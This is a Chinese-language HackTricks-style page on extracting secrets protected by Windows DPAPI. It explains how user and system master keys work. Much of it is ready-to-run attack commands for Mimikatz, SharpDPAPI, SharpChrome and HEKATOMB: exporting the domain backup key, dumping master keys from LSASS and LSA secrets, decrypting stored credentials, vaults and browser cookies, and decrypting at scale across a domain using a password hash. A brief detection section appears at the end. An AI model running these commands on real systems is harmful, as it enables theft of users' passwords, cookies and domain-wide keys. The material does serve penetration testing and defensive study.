# DPAPI - 提取密码

{{#include ../../banners/hacktricks-training.md}}



## 什么是 DPAPI

数据保护 API (DPAPI) 主要用于 Windows 操作系统中，用于 **对称加密非对称私钥**，利用用户或系统秘密作为重要的熵来源。这种方法简化了开发人员的加密工作，使他们能够使用从用户登录秘密派生的密钥进行数据加密，或者对于系统加密，使用系统的域认证秘密，从而免去开发人员自己管理加密密钥保护的需要。

使用 DPAPI 的最常见方法是通过 **`CryptProtectData` 和 `CryptUnprotectData`** 函数，这些函数允许应用程序在当前登录的进程会话中安全地加密和解密数据。这意味着加密的数据只能由加密它的同一用户或系统解密。

此外，这些函数还接受一个 **`entropy` 参数**，该参数在加密和解密过程中也会被使用，因此，为了解密使用此参数加密的内容，必须提供在加密过程中使用的相同熵值。

### 用户密钥生成

DPAPI 为每个用户生成一个唯一的密钥（称为 **`pre-key`**），该密钥基于用户的凭据生成。此密钥是从用户的密码和其他因素派生的，算法取决于用户的类型，但最终是 SHA1。例如，对于域用户，**它取决于用户的 HTLM 哈希**。

这特别有趣，因为如果攻击者能够获得用户的密码哈希，他们可以：

- **解密任何使用 DPAPI 加密的数据**，而无需联系任何 API
- 尝试 **离线破解密码**，试图生成有效的 DPAPI 密钥

此外，每次用户使用 DPAPI 加密某些数据时，都会生成一个新的 **主密钥**。这个主密钥实际上用于加密数据。每个主密钥都有一个 **GUID**（全局唯一标识符）来标识它。

主密钥存储在 **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`** 目录中，其中 `{SID}` 是该用户的安全标识符。主密钥是通过用户的 **`pre-key`** 加密存储的，同时也通过 **域备份密钥** 进行恢复（因此同一密钥被加密存储两次，使用两种不同的密码）。

请注意，用于加密主密钥的 **域密钥存储在域控制器中，并且永远不会更改**，因此如果攻击者可以访问域控制器，他们可以检索域备份密钥并解密域中所有用户的主密钥。

加密的 blob 包含用于加密数据的 **主密钥的 GUID**，该 GUID 存储在其头部。

> [!NOTE]
> DPAPI 加密的 blob 以 **`01 00 00 00`** 开头

查找主密钥：
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
这就是用户的一组主密钥的样子：

![](<../../images/image (1121).png>)

### 机器/系统密钥生成

这是用于机器加密数据的密钥。它基于**DPAPI_SYSTEM LSA 密钥**，这是一个只有 SYSTEM 用户可以访问的特殊密钥。此密钥用于加密需要由系统本身访问的数据，例如机器级凭据或系统范围的秘密。

请注意，这些密钥**没有域备份**，因此只能在本地访问：

- **Mimikatz** 可以通过使用命令 `mimikatz lsadump::secrets` 转储 LSA 秘密来访问它。
- 该秘密存储在注册表中，因此管理员可以**修改 DACL 权限以访问它**。注册表路径为：`HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`

### DPAPI 保护的数据

DPAPI 保护的个人数据包括：

- Windows 凭据
- Internet Explorer 和 Google Chrome 的密码及自动完成数据
- 应用程序（如 Outlook 和 Windows Mail）的电子邮件和内部 FTP 账户密码
- 共享文件夹、资源、无线网络和 Windows Vault 的密码，包括加密密钥
- 远程桌面连接的密码、.NET Passport 和各种加密和身份验证目的的私钥
- 由凭据管理器管理的网络密码以及使用 CryptProtectData 的应用程序中的个人数据，例如 Skype、MSN messenger 等
- 注册表中的加密数据块
- ...

系统保护的数据包括：
- Wifi 密码
- 计划任务密码
- ...

### 主密钥提取选项

- 如果用户具有域管理员权限，他们可以访问**域备份密钥**以解密域中的所有用户主密钥：
```bash
# Mimikatz
lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export

# SharpDPAPI
SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
```
- 拥有本地管理员权限后，可以**访问 LSASS 内存**以提取所有连接用户的 DPAPI 主密钥和 SYSTEM 密钥。
```bash
# Mimikatz
mimikatz sekurlsa::dpapi
```
- 如果用户具有本地管理员权限，他们可以访问 **DPAPI_SYSTEM LSA 密钥** 以解密机器主密钥：
```bash
# Mimikatz
lsadump::secrets /system:DPAPI_SYSTEM /export
```
- 如果已知用户的密码或 NTLM 哈希，您可以**直接解密用户的主密钥**：
```bash
# Mimikatz
dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected

# SharpDPAPI
SharpDPAPI.exe masterkeys /password:PASSWORD
```
- 如果您以用户身份处于会话中，可以通过 RPC 向 DC 请求 **备份密钥以解密主密钥**。如果您是本地管理员并且用户已登录，您可以为此 **窃取他的会话令牌**：
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
## 列表保险库
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## 访问 DPAPI 加密数据

### 查找 DPAPI 加密数据

常见用户 **保护的文件** 位于：

- `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
- 还可以在上述路径中将 `\Roaming\` 更改为 `\Local\` 进行检查。

枚举示例：
```bash
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI) 可以在文件系统、注册表和 B64 blobs 中找到 DPAPI 加密的 blobs：
```bash
# Search blobs in the registry
search /type:registry [/path:HKLM] # Search complete registry by default

# Search blobs in folders
search /type:folder /path:C:\path\to\folder
search /type:folder /path:C:\Users\username\AppData\

# Search a blob inside a file
search /type:file /path:C:\path\to\file

# Search a blob inside B64 encoded data
search /type:base64 [/base:<base64 string>]
```
注意，[**SharpChrome**](https://github.com/GhostPack/SharpDPAPI)（来自同一仓库）可以用于使用 DPAPI 解密敏感数据，如 cookies。

### 访问密钥和数据

- **使用 SharpDPAPI** 从当前会话的 DPAPI 加密文件中获取凭据：
```bash
# Decrypt user data
## Note that 'triage' is like running credentials, vaults, rdg and certificates
SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect

# Decrypt machine data
SharpDPAPI.exe machinetriage
```
- **获取凭据信息**，如加密数据和 guidMasterKey。
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
- **访问主密钥**：

通过使用 RPC 解密请求 **域备份密钥** 的用户的主密钥：
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
**SharpDPAPI** 工具还支持这些用于主密钥解密的参数（注意可以使用 `/rpc` 获取域的备份密钥，使用 `/password` 来使用明文密码，或使用 `/pvk` 指定 DPAPI 域私钥文件...）：
```
/target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
/pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk            -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X             -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X                 -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X              -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                    -   decrypt the target user's masterkeys by asking domain controller to do so
/server:SERVER          -   triage a remote server, assuming admin access
/hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
```
- **使用主密钥解密数据**:
```bash
# Mimikatz
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>

# SharpDPAPI
SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
```
**SharpDPAPI** 工具还支持这些参数用于 `credentials|vaults|rdg|keepass|triage|blob|ps` 解密（注意可以使用 `/rpc` 获取域备份密钥，使用 `/password` 以明文密码，使用 `/pvk` 指定 DPAPI 域私钥文件，使用 `/unprotect` 以当前用户会话...）：
```
Decryption:
/unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
/pvk:BASE64...      -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X         -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X             -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X          -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                -   decrypt the target user's masterkeys by asking domain controller to do so
GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption
/mkfile:FILE        -   use a file of one or more GUID:SHA1 masterkeys for decryption

Targeting:
/target:FILE/folder -   triage a specific 'Credentials','.rdg|RDCMan.settings', 'blob', or 'ps' file location, or 'Vault' folder
/server:SERVER      -   triage a remote server, assuming admin access
Note: must use with /pvk:KEY or /password:X
Note: not applicable to 'blob' or 'ps' commands
```
- 使用 **当前用户会话** 解密一些数据：
```bash
# Mimikatz
dpapi::blob /in:C:\path\to\encrypted\file /unprotect

# SharpDPAPI
SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
```
### 访问其他机器数据

在 **SharpDPAPI 和 SharpChrome** 中，您可以指示 **`/server:HOST`** 选项以访问远程机器的数据。当然，您需要能够访问该机器，在以下示例中假设 **域备份加密密钥已知**：
```bash
SharpDPAPI.exe triage /server:HOST /pvk:BASE64
SharpChrome cookies /server:HOST /pvk:BASE64
```
## 其他工具

### HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) 是一个自动提取 LDAP 目录中所有用户和计算机的工具，并通过 RPC 提取域控制器备份密钥。然后，脚本将解析所有计算机的 IP 地址，并在所有计算机上执行 smbclient，以检索所有用户的所有 DPAPI blobs，并使用域备份密钥解密所有内容。

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

通过从 LDAP 提取的计算机列表，您可以找到每个子网络，即使您不知道它们！

### DonPAPI

[**DonPAPI**](https://github.com/login-securite/DonPAPI) 可以自动转储受 DPAPI 保护的秘密。

### 常见检测

- 访问 `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`、`C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` 和其他与 DPAPI 相关的目录中的文件。
- 特别是来自网络共享，如 C$ 或 ADMIN$。
- 使用 Mimikatz 访问 LSASS 内存。
- 事件 **4662**：对对象执行了操作。
- 可以检查此事件以查看是否访问了 `BCKUPKEY` 对象。

## 参考

- [https://www.passcape.com/index.php?section=docsys\&cmd=details\&id=28#13](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)

{{#include ../../banners/hacktricks-training.md}}
